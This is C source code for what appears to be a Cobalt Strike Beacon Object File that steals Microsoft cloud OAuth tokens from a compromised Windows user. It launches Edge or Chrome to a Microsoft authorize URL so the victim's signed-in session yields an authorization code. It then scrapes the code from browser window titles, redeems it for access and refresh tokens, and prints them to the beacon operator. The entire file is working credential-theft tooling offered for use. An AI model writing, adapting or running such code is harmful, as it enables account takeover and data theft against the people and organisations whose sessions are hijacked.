#include <windows.h>
#include <winuser.h>
#include <winhttp.h>
#include "beacon.h"
#include "bofdefs.h"

/* Configuration Constants */
#define MAX_TOKEN_LENGTH    8192   /* Maximum size for OAuth tokens (access/refresh) */
#define MAX_TITLE_LENGTH    4096   /* Maximum size for window title buffer */
#define MAX_URL_LENGTH      2048   /* Maximum size for authorization URL and code */
#define MAX_CMD_LENGTH      2200   /* Maximum size for browser launch command */
#define MAX_POST_DATA       2048   /* Maximum size for token exchange POST data */
#define MAX_RESPONSE_SIZE   8192   /* Maximum size for HTTP response from token endpoint */

#define POLL_INTERVAL_MS    100    /* Window polling interval in milliseconds */
#define MAX_POLL_TIME_MS    15000  /* Maximum time to wait for authcode (15 seconds) */

/* OAuth2 Endpoints */
#define OAUTH_DOMAIN        L"login.microsoftonline.com"
#define OAUTH_TOKEN         L"/common/oauth2/v2.0/token"
#define OAUTH_AUTHORIZE     "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
#define OAUTH_REDIRECT_URI  "https://login.microsoftonline.com/common/oauth2/nativeclient"

/* Resolve linker error */
void ___chkstk_ms() {}

/* Argument validation */
#define CHECK_ARG(arg, name) \
    if ((arg) == NULL || *(arg) == '\0') { \
        BeaconPrintf(CALLBACK_ERROR, "'%s' is a required argument.\n", name); \
        return; \
    }

/* Browser config */
typedef struct {
    const char *name;
    const char *path;
} BrowserConfig;

static const BrowserConfig BROWSERS[] = {
    {"Microsoft Edge", "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\""},
    {"Google Chrome", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""}
};

static const int BROWSER_COUNT = sizeof(BROWSERS) / sizeof(BROWSERS[0]);

/* Launch browser with authcode URL */
BOOL launch_browser(const BrowserConfig *browser, const char *url) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmd[MAX_CMD_LENGTH];

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    MSVCRT$_snprintf(cmd, sizeof(cmd), "%s \"%s\"", browser->path, url);

    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to launch %s (Error: %lu)\n",
                    browser->name, KERNEL32$GetLastError());
        return FALSE;
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "Launched %s to %s\n", browser->name, url);
    return TRUE;
}

/*
 * Extract authorization code from browser window title
 * Polls window titles for redirect URI containing auth code
 * Returns TRUE if code found, FALSE on timeout
 */
BOOL extract_auth_code(char *authCode, size_t codeSize) {
    char title[MAX_TITLE_LENGTH];
    int attempts = 0;
    int foundSignIn = 0;
    int foundLongCode = 0;  // Track if we've already reported a long code
    const int maxAttempts = MAX_POLL_TIME_MS / POLL_INTERVAL_MS;

    BeaconPrintf(CALLBACK_OUTPUT, "Monitoring for authcode (timeout: %d seconds)...\n",
                MAX_POLL_TIME_MS / 1000);

    while (attempts < maxAttempts) {
        /* Enumerate all visible top-level windows */
        for (HWND hwnd = USER32$GetTopWindow(NULL); hwnd != NULL; hwnd = USER32$GetWindow(hwnd, GW_HWNDNEXT)) {
            if (!USER32$IsWindowVisible(hwnd))
                continue;

            MSVCRT$memset(title, 0, sizeof(title));
            if (!USER32$GetWindowTextA(hwnd, title, sizeof(title)))
                continue;

            /* Look for OAuth redirect URI in window title */
            if (title[0] && strstr(title, "/common/oauth2/nativeclient?code=")) {
                char *codeStart = strstr(title, "code=");
                if (!codeStart)
                    continue;

                codeStart += 5;

                /* Find end of code parameter */
                char *codeEnd = strstr(codeStart, "&session_state=");
                if (!codeEnd)
                    codeEnd = strstr(codeStart, "&");

                if (!codeEnd)
                    continue;

                size_t codeLength = codeEnd - codeStart;
                if (codeLength >= codeSize) {
                    if (!foundLongCode) {
                        BeaconPrintf(CALLBACK_ERROR, "Authcode too long (%d bytes, buffer is %d bytes). Increase MAX_URL_LENGTH.\n",
                                   codeLength, codeSize);
                        foundLongCode = 1;
                    }
                    continue;
                }

                MSVCRT$strncpy_s(authCode, codeSize, codeStart, codeLength);
                authCode[codeLength] = '\0';

                BeaconPrintf(CALLBACK_OUTPUT, "Authcode found after %dms: %s\n",
                           attempts * POLL_INTERVAL_MS, authCode);
                return TRUE;
            }

            /* Track if we see the sign-in page (English only, but meh) */
            if (title[0] && strstr(title, "Sign in to your account")) {
                foundSignIn = 1;
            }
        }

        attempts++;
        if (attempts < maxAttempts) {
            KERNEL32$Sleep(POLL_INTERVAL_MS);
        }
    }

    /* Provide diagnostic info on timeout */
    if (foundLongCode) {
        BeaconPrintf(CALLBACK_ERROR, "Timeout - authcode was found but too long for buffer. Recompile with larger MAX_URL_LENGTH.\n");
    } else if (foundSignIn) {
        BeaconPrintf(CALLBACK_ERROR,
            "No code found after %d seconds. (\"Sign in\" window detected!)\n\n"
            "Possible causes:\n"
            "--> User is not authenticated in this browser, or session has expired\n"
            "--> Client ID does not have consent in the tenant (try another Client ID?)\n"
            "--> Client ID does not permit the specified scope\n"
            "--> Client ID does not accept 'https://login.microsoftonline.com/common/oauth2/nativeclient' as a redirect_uri value\n",
            MAX_POLL_TIME_MS / 1000);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Timeout after %d seconds. No authcode found.\n",
            MAX_POLL_TIME_MS / 1000);
    }

    return FALSE;
}

/* Exchange the authcode for access and refresh tokens */
BOOL exchange_code_for_tokens(const char *clientId, const char *scope,
                               const char *authCode, char *response, size_t responseSize) {
    char postData[MAX_POST_DATA] = {0};
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;

    /* Build POST data */
    MSVCRT$_snprintf(postData, sizeof(postData),
        "client_id=%s&redirect_uri=%s&grant_type=authorization_code&scope=%s&code=%s",
        clientId, OAUTH_REDIRECT_URI, scope, authCode);

    /* Initialize WinHTTP session */
    const wchar_t *userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    hSession = WINHTTP$WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        return FALSE;
    }

    /* Connect to OAuth server */
    hConnect = WINHTTP$WinHttpConnect(hSession, OAUTH_DOMAIN, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        goto cleanup;
    }

    /* Create POST request */
    hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"POST", OAUTH_TOKEN, NULL,
                                          WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpOpenRequest failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        goto cleanup;
    }

    /* Add Content-Type header */
    const wchar_t *headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    if (!WINHTTP$WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpAddRequestHeaders failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        goto cleanup;
    }

    /* Send POST request */
    DWORD postDataLen = MSVCRT$strlen(postData);
    if (!WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     postData, postDataLen, postDataLen, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        goto cleanup;
    }

    /* Receive response */
    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpReceiveResponse failed (Error: %lu)\n",
                    KERNEL32$GetLastError());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Exchanging authcode for tokens...\n");

    /* Read response body */
    DWORD totalRead = 0, bytesRead = 0;
    while (totalRead < responseSize - 1) {
        if (!WINHTTP$WinHttpReadData(hRequest, response + totalRead,
                                      responseSize - 1 - totalRead, &bytesRead)) {
            break;
        }
        if (bytesRead == 0)
            break;
        totalRead += bytesRead;
    }

    response[totalRead] = '\0';

    if (totalRead == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Received empty response from token endpoint\n");
        goto cleanup;
    }

    success = TRUE;

cleanup:
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    return success;
}

/* Parse JSON string value from response */
BOOL parse_json_string(const char *json, const char *key, char *output, size_t outputSize) {
    char searchPattern[64];
    MSVCRT$_snprintf(searchPattern, sizeof(searchPattern), "\"%s\":\"", key);

    char *start = strstr(json, searchPattern);
    if (!start)
        return FALSE;

    start += MSVCRT$strlen(searchPattern);
    char *end = strstr(start, "\"");

    if (!end || (size_t)(end - start) >= outputSize)
        return FALSE;

    size_t length = end - start;
    MSVCRT$strncpy_s(output, outputSize, start, length);
    output[length] = '\0';

    return TRUE;
}

/* Parse and display tokens from response */
void parse_tokens(const char *response) {
    char buffer[MAX_TOKEN_LENGTH];

    /* Check for error response */
    if (parse_json_string(response, "error", buffer, sizeof(buffer))) {
        BeaconPrintf(CALLBACK_ERROR, "\nToken endpoint error: %s\n", buffer);

        if (parse_json_string(response, "error_description", buffer, sizeof(buffer))) {
            BeaconPrintf(CALLBACK_ERROR, "Description: %s\n", buffer);
        }
        return;
    }

    /* Parse access token (required) */
    if (parse_json_string(response, "access_token", buffer, sizeof(buffer))) {
        BeaconPrintf(CALLBACK_OUTPUT, "\nAccess Token:\n---------------------\n%s\n", buffer);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "No access_token in response\n");
        return;
    }

    /* Parse refresh token (optional) */
    if (parse_json_string(response, "refresh_token", buffer, sizeof(buffer))) {
        BeaconPrintf(CALLBACK_OUTPUT, "Refresh Token:\n---------------------\n%s\n", buffer);
    }
}

/* Build OAuth authorization URL */
void build_auth_url(char *url, size_t urlSize, const char *clientId,
                    const char *scope, const char *emailHint) {
    MSVCRT$_snprintf(url, urlSize,
        "%s?client_id=%s&redirect_uri=%s&response_type=code&scope=%s%s%s",
        OAUTH_AUTHORIZE, clientId, OAUTH_REDIRECT_URI, scope,
        (emailHint && *emailHint) ? "&login_hint=" : "",
        emailHint ? emailHint : "");
}

/* Main BOF entry point */
void go(char *args, int length) {
    datap parser;
    char *clientId, *scope, *emailHint;
    int browserIndex;
    char authUrl[MAX_URL_LENGTH];
    char authCode[MAX_URL_LENGTH];
    char response[MAX_RESPONSE_SIZE];

    /* Parse arguments */
    BeaconDataParse(&parser, args, length);
    clientId = BeaconDataExtract(&parser, NULL);
    scope = BeaconDataExtract(&parser, NULL);
    browserIndex = BeaconDataInt(&parser);
    emailHint = BeaconDataExtract(&parser, NULL);

    /* Validate required arguments */
    CHECK_ARG(clientId, "clientid");
    CHECK_ARG(scope, "scope");

    if (browserIndex < 0 || browserIndex >= BROWSER_COUNT) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid browser index. Must be 0 (Edge) or 1 (Chrome).\n");
        return;
    }

    /* Build authorization URL */
    build_auth_url(authUrl, sizeof(authUrl), clientId, scope, emailHint);

    /* Launch browser with authorization URL */
    if (!launch_browser(&BROWSERS[browserIndex], authUrl)) {
        return;
    }

    /* Extract authorization code from browser window */
    if (!extract_auth_code(authCode, sizeof(authCode))) {
        return;
    }

    /* Exchange code for tokens */
    if (!exchange_code_for_tokens(clientId, scope, authCode, response, sizeof(response))) {
        BeaconPrintf(CALLBACK_ERROR, "Token exchange failed. Try again or manually exchange with:\n");
        BeaconPrintf(CALLBACK_ERROR, "    Code: %s\n", authCode);
        return;
    }

    /* Parse and display tokens */
    parse_tokens(response);
}
